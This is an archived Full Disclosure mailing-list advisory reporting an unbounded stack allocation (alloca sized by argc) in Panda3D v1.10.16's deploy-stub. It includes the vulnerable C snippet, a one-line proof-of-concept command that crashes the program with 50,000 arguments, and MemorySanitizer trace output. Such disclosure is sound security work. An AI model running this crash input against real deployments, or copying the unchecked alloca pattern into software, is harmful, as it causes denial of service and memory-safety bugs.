---
title: Panda3d v1.10.16 deploy-stub Unbounded Stack Allocation Leading to Uninitialized Memory
url: https://seclists.org/fulldisclosure/2026/Jan/9
source: Full Disclosure
date: 2026-01-06
fetch_date: 2026-01-07T03:30:40.647635
---

# Panda3d v1.10.16 deploy-stub Unbounded Stack Allocation Leading to Uninitialized Memory

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

![](/shared/images/nst-icons.svg#search)

# Panda3d v1.10.16 deploy-stub Unbounded Stack Allocation Leading to Uninitialized Memory

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Thu, 1 Jan 2026 02:27:18 -0500

---

```
A memory safety vulnerability exists in the Panda3D deploy-stub executable
due to unbounded stack allocation using attacker-controlled input. The
issue allows a local attacker to trigger stack exhaustion and subsequent
use of uninitialized memory during Python interpreter initialization,
resulting in a reliable crash and undefined behavior. The vulnerability is
confirmed by MemorySanitizer (MSAN) as a use-of-uninitialized-value
originating from stack memory.

The deploy-stub executable allocates memory on the stack using alloca()
based directly on the process argument count (argc), which is fully
attacker-controlled. No bounds checking or validation is performed prior to
allocation.
Vulnerable Code
if (argc > 0) {
    argv_copy  = (wchar_t **)alloca(sizeof(wchar_t *) * argc);
    argv_copy2 = (wchar_t **)alloca(sizeof(wchar_t *) * argc);
}
Because alloca() allocates memory on the stack without initialization,
large values of argc cause excessive stack consumption and propagate
uninitialized stack memory into subsequent logic. During Python interpreter
initialization, this uninitialized data is later consumed by string
handling routines (strlen, strcmp), resulting in undefined behavior.

*Root Cause:*
* argc is attacker-controlled
* alloca() performs unbounded stack allocation
* Allocated memory is not initialized
* Stack exhaustion causes corruption and exposure of uninitialized stack
bytes
* Python initialization code consumes this tainted memory

*Impact:*
* *Denial of Service (DoS):* Reliable crash of deploy-stub
* *Memory Corruption: *Use of uninitialized stack memory (MSAN-verified)
* *Pre-authentication:* Triggered immediately on process start
* *Undefined Behavior:* Execution proceeds with corrupted stack state

*Proof of Concept:*
./deploy-stub $(printf 'A %.0s' {1..50000})

*Output:*Uninitialized bytes in strlen at offset 3 inside [0xe01000000050,
8)
==3236655==WARNING: MemorySanitizer: use-of-uninitialized-value
    #0 0xffffa06b66d4
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2b66d4) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #1 0xffffa06b3424
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2b3424) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #2 0xffffa06b67a4
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2b67a4) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #3 0xffffa06b6cc4
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2b6cc4) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #4 0xffffa06b711c
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2b711c) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #5 0xffffa06feccc
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2feccc) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #6 0xffffa06daf68
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2daf68) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #7 0xffffa06dc324
 (/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2dc324) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #8 0xffffa06e04d0 in Py_InitializeFromConfig
(/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2e04d0) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #9 0xffffa06e06c0 in Py_InitializeEx
(/lib/aarch64-linux-gnu/libpython3.13.so.1.0+0x2e06c0) (BuildId:
9b2b167471b167d36ba5bebb0ec8b62e324eed40)
    #10 0xaaaaba2aa0f0 in Py_FrozenMain
/root/panda3d/pandatool/src/deploy-stub/deploy-stub.c:466:5
    #11 0xaaaaba2ab9d8 in main
/root/panda3d/pandatool/src/deploy-stub/deploy-stub.c:751:12
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](8)
[By Date](date.html#9)
[![Next](/images/right-icon-16x16.png)](10)

[![Previous](/images/left-icon-16x16.png)](8)
[By Thread](index.html#9)
[![Next](/images/right-icon-16x16.png)](10)

### Current thread:

* **Panda3d v1.10.16 deploy-stub Unbounded Stack Allocation Leading to Uninitialized Memory** *Ron E (Jan 05)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")